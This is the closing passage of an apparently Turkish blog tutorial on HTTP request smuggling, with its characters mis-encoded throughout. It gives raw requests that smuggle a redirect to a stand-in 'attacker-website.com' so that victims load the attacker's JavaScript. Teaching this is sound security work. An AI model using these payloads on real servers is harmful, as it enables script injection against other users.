<h3 id="normal-bir-yÃ¶nlendirmeyi-open-redirect-olarak-kullanmak">Normal Bir YÃ¶nlendirmeyi Open Redirect Olarak Kullanmak</h3>

<p>Bir Ã§ok web uygulamasÄ± yÃ¶nlendirme iÅŸlemini kullanÄ±r. Hatta bazÄ± uygulamalar iÃ§in vazgeÃ§ilmezlerdir. Normal bir ÅŸekilde uygulamanÄ±n /home dizinine eriÅŸmek istediÄŸini belirten bir istek ve aldÄ±ÄŸÄ± normal yanÄ±tÄ± gÃ¶rÃ¼yorsunuz.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      GET /home HTTP/1.1
      Host: normal-website.com

      HTTP/1.1 301 Moved Permanently
      Location: https://normal-website.com/home/
</code></pre></div></div>

<p>KiÅŸi GET metodu ile normal-website sitesinin /home dizinine eriÅŸmek istediÄŸini belirtmiÅŸ. YanÄ±t olarak da 301 yÃ¶nlendirme kodunu alarak, istediÄŸi yer, kiÅŸiye gÃ¶nderilmiÅŸ. Hadi burada da zaafiyet tespiti yapalÄ±m.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Length: 54
      Transfer-Encoding: chunked

      0

      GET /home HTTP/1.1
      Host: attacker-website.com
      Foo: X
</code></pre></div></div>

<p>KaÃ§ak istek, attacker-websitesiâ€™ne yÃ¶nlendirme iÃ§erir. Bu yÃ¶nlendirmeden bir sonraki kullanÄ±cÄ± etkilenecektir. Ã–rneÄŸin;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      GET /home HTTP/1.1
      Host: attacker-website.com
      Foo: XGET /scripts/include.js HTTP/1.1
      Host: vulnerable-website.com

      HTTP/1.1 301 Moved Permanently
      Location: https://attacker-website.com/home/
</code></pre></div></div>

<p>Burada, kullanÄ±cÄ± sitenin /scripts dizininde bulunan include.js JavaScript dosyasÄ±na ulaÅŸmak istemiÅŸ. Ancak saldÄ±rganÄ±n daha Ã¶nceden kaÃ§Ä±rdÄ±ÄŸÄ± istek yÃ¼zÃ¼nden, kullanÄ±cÄ±nÄ±n isteÄŸi yerine saldÄ±rganÄ±n yÃ¶nlendirmesi Ã§alÄ±ÅŸÄ±yor. SaldÄ±rgan yaptÄ±ÄŸÄ± bu yÃ¶nlendirme ile, kendi sitesine yazdÄ±ÄŸÄ± JavaScript kodlarÄ±nÄ± kurbanÄ±n bilgisayarÄ±nda Ã§alÄ±ÅŸtÄ±rabilir.</p>

<h2 id="Ã¶zet">Ã–zet</h2>

<p>Bu yazÄ±da, sizlere HTTP Request Smuggling aÃ§Ä±ÄŸÄ±ndan bahsettim. Teknoloji sÃ¼rekli geliÅŸiyor, bu yÃ¼zden benim burada bahsetmediÄŸim aÃ§Ä±k tespit yÃ¶ntemleri ve sÃ¶mÃ¼rme yÃ¶ntemleri olabilir. Daha fazlasÄ± iÃ§in her zaman araÅŸtÄ±rmanÄ±z sizi sÃ¼rekli daha ileri seviyelere gÃ¶tÃ¼recektir. GÃ¼ncel kalmanÄ±z dileÄŸiyleâ€¦</p>

<p><strong>Fatih Furkan HatipoÄŸlu</strong></p>

<p>Â </p>

<p>Bana bu kadar bilgi yetmez, daha fazlasÄ±nÄ± istiyorum diyenler iÃ§in birkaÃ§ tavsiye kaynak:</p>

<p><a href="https://portswigger.net/web-security/request-smuggling">PortSwigger - HTTP Request Smuggling</a></p>

<p><a href="https://portswigger.net/web-security/request-smuggling/finding">PortSwigger - HTTP Request Smuggling aÃ§Ä±ÄŸÄ± bulma</a></p>

<p><a href="https://portswigger.net/web-security/request-smuggling/finding">PortSwigger - HTTP Request Smuggling aÃ§Ä±ÄŸÄ±nÄ± exploitleme</a></p>
:ET